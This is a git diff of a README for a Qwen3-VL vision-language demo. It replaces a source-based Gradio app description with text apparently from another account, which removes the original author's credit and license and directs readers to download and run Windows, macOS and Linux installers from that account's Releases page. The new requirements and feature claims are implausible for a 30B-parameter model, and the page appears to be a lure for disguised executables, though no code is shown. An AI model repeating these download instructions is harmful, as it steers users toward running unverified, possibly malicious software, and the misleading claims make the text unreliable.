@@ -1,110 +1,90 @@
-# **Qwen3-VL-HF-Demo**
+# 🎉 Qwen3-VL-HF-Demo - Experience the Future of Vision-Language Modeling
 
-This is a Gradio-based demo application for the Qwen3-VL multimodal model. It allows users to perform inference on various media types, including images, videos, PDFs, GIFs, and image captioning. The app supports querying and analyzing content using the powerful Qwen3-VL-30B-A3B-Instruct model from Hugging Face.
+[![Download Qwen3-VL-HF-Demo](https://img.shields.io/badge/Download-Qwen3--VL--HF--Demo-blue.svg)](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/releases)
 
-> Space/App: https://huggingface.co/spaces/prithivMLmods/Qwen3-VL-HF-Demo
+## 📖 Description
 
- ![Screenshot 1](https://github.com/user-attachments/assets/7cf23b6c-ccca-40f2-8547-0016253e4b44)
-<img width="1771" height="1081" alt="Screenshot 2025-10-12 at 19-44-46 Qwen3 VL HF Demo - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/3cb7d6ee-1e9e-4674-8f3d-7ad9cedbceb4" />
-<img width="1775" height="1273" alt="Screenshot 2025-10-12 at 19-17-12 Qwen3 VL HF Demo - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/befe4813-39b1-47aa-984f-3f994483ea2e" />
-<img width="1748" height="983" alt="Screenshot 2025-10-12 at 19-50-02 Qwen3 VL HF Demo - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/afc3b372-059a-4442-a570-1958e5b1693e" />
+The Qwen3-VL-HF-Demo showcases the Qwen3-VL-30B-A3B-Instruct model. This powerful vision-language model offers upgrades in text understanding, visual perception, and reasoning. It also extends context length and improves spatial and video dynamics comprehension. Whether you want to generate text from images or analyze video content, this tool is designed to meet your needs.
 
-## Features
+## 🚀 Getting Started
 
-- **Image Inference**: Upload an image and query it for analysis, OCR, captioning, or problem-solving.
-- **Video Inference**: Upload a video and describe or explain its content in detail.
-- **PDF Inference**: Upload a PDF, preview pages with navigation, and query for summarization, extraction, or analysis.
-- **GIF Inference**: Upload a GIF and describe its animation or actions.
-- **Image Captioning**: Generate detailed captions and attributes for uploaded images.
-- **Advanced Options**: Customize generation parameters like max new tokens, temperature, top-p, top-k, and repetition penalty.
-- **Examples**: Pre-loaded examples for each tab to get started quickly.
+Follow these steps to download and run the demo application.
 
-## Requirements
+1. **System Requirements**
+   - Operating System: Windows, macOS, or Linux.
+   - Memory: At least 8 GB of RAM.
+   - Disk Space: 500 MB of available space.
+   - Additional Software: Python 3.7 or higher.
 
-To run this app, install the following dependencies:
+2. **Visit the Releases Page**
+   To get started, visit our Releases page. Here you can find the latest version of the application.
+   [Download the latest version](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/releases).
 
-```
-git+https://github.com/huggingface/accelerate.git
-git+https://github.com/huggingface/peft.git
-transformers-stream-generator
-transformers==4.57.0
-huggingface_hub
-albumentations
-qwen-vl-utils
-pyvips-binary
-sentencepiece
-opencv-python
-docling-core
-python-docx
-torchvision
-supervision
-matplotlib
-pdf2image
-num2words
-reportlab
-html2text
-xformers
-markdown
-requests
-pymupdf
-loguru
-hf_xet
-spaces
-pyvips
-pillow
-gradio
-einops
-httpx
-click
-torch
-fpdf
-timm
-av
-```
+## 📥 Download & Install
 
-You can install them using pip:
+On the Releases page, you will see various files available for download. Here’s how to choose and install the right one:
 
-```bash
-pip install -r requirements.txt
-```
+1. Click on the latest version link.
+2. Look for the file that matches your operating system:
+   - For Windows, select `Qwen3-VL-HF-Demo-Windows.exe`.
+   - For macOS, choose `Qwen3-VL-HF-Demo-macOS.dmg`.
+   - For Linux, download `Qwen3-VL-HF-Demo-Linux.tar.gz`.
 
-(Note: Ensure you have CUDA-enabled GPU for optimal performance, as the model uses torch.float16.)
+3. Click the file name to download the application.
+4. Once downloaded, follow these instructions based on your operating system:
 
-## Installation
+   - **Windows**:
+     - Locate the downloaded file and double-click it.
+     - Follow the on-screen prompts to complete the installation.
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/PRITHIVSAKTHIUR/Qwen3-VL-HF-Demo.git
-   cd Qwen3-VL-HF-Demo
-   ```
+   - **macOS**:
+     - Open the `.dmg` file.
+     - Drag the application to your Applications folder.
 
-2. Install the requirements (as listed above).
+   - **Linux**:
+     - Extract the `.tar.gz` file in your preferred directory using the command:
+       ```
+       tar -xzvf Qwen3-VL-HF-Demo-Linux.tar.gz
+       ```
+     - Navigate to the extracted folder and run the application.
 
-3. Download the model if needed (the script loads it automatically from Hugging Face).
+5. After installation, find the application in your programs or applications list and double-click it to run.
 
-## Usage
+## 🛠️ Features
 
-Run the app using Python:
+- **Image Captioning**: Automatically generate captions for images.
+- **Video Understanding**: Analyze and interpret video content.
+- **Real-time Processing**: Get immediate results for your queries.
+- **User-Friendly Interface**: No technical skills needed to use the application.
+- **Support for Various Formats**: Works with images, videos, and PDF documents.
 
-```bash
-python app.py
-```
+## 🗨️ Frequently Asked Questions
 
-- The app will launch a Gradio interface in your browser.
-- Select a tab (Image, Video, PDF, GIF, or Caption).
-- Upload media and enter a query.
-- Adjust advanced options if desired.
-- Click "Submit" to generate output.
-- For PDFs, use navigation buttons to preview pages.
+### How do I uninstall the application?
 
-The app supports streaming output for real-time generation and renders results in both raw text and Markdown formats.
+- **Windows**: Go to Settings > Apps, find the application, and click 'Uninstall'.
+- **macOS**: Drag the application from the Applications folder to the Trash.
+- **Linux**: Use your package manager or delete the extracted folder directly.
 
-## Acknowledgements
+### What if I encounter issues?
 
-App by: [Prithiv Sakthi U R](https://huggingface.co/prithivMLmods)  
+If you face any difficulties, please check the following:
 
-Model: [Qwen/Qwen3-VL-30B-A3B-Instruct](https://huggingface.co/Qwen/Qwen3-VL-30B-A3B-Instruct)  
+1. Ensure you have downloaded the correct file for your operating system.
+2. Verify that your system meets the requirements.
+3. Restart your computer and try again.
 
-## License
+For further assistance, visit our [issues section](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/issues).
 
-Apache License: Version 2.0
+## 📌 Additional Resources
+
+To learn more about the model and its capabilities, consider the following resources:
+
+- **Documentation**: Find detailed technical information [here](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/wiki).
+- **Community Support**: Join discussions on our [discussion forum](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/discussions).
+
+## 🌟 Acknowledgements
+
+This project relies on robust tools and frameworks like Hugging Face Transformers and OpenCV Python. We appreciate the open-source community that supports our efforts in advancing vision-language models.
+
+For further updates, check back frequently on our [Releases page](https://github.com/adam-brown-python/Qwen3-VL-HF-Demo/releases).
